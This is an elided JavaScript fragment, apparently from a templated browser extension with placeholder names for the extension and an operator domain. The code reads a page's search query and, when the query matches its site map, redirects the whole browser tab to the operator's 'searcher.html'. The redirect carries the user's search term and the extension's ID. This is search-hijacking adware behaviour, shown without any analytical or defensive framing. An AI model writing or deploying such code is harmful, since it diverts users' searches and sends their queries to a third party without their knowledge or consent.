...
RNG_EXT_NAME_RNGCnst.SUSPEND_PARAM_VAL = "suspend_" + "RNG_EXT_NAME_RNG";
RNG_EXT_NAME_RNGCnst.SEARCH_SITES =
...
var RNG_EXT_NAME_RNGRedirect = function(){
	...
	if(typeof QueryString[RNG_EXT_NAME_RNGCnst.SUSPEND_PARAM_VAL ] !== "undefined"){
		return;
	}
	...
	var valFromMap = RNG_EXT_NAME_RNGSiteMap[QueryString.q] ;
	if(typeof valFromMap === "undefined" ){

		valFromMap = RNG_EXT_NAME_RNGSiteMap[encodeURIComponent(QueryString.q)];
	}

	if(typeof valFromMap === "undefined" ){

		valFromMap = RNG_EXT_NAME_RNGSiteMap[encodeURIComponent(encodeURIComponent(QueryString.q))];
	}
	...
	typeof valFromMap!== "undefined"  &&(function(){
		...
		var d = "RNG_OPDOM_NAME_RNG";
		top.location.href = d +"/searcher.html?#q=" + encodeURIComponent(valFromMap) + "&term=" + encodeURIComponent(QueryString.q)
		+"&sus=" + RNG_EXT_NAME_RNGCnst.SUSPEND_PARAM_VAL + "&name=RNG_EXT_NAME_RNG" + "&id=" + chrome.runtime.id;
...
var isAllowedBySite = function(url){
	var allowedSites = RNG_EXT_NAME_RNGCnst.SEARCH_SITES;
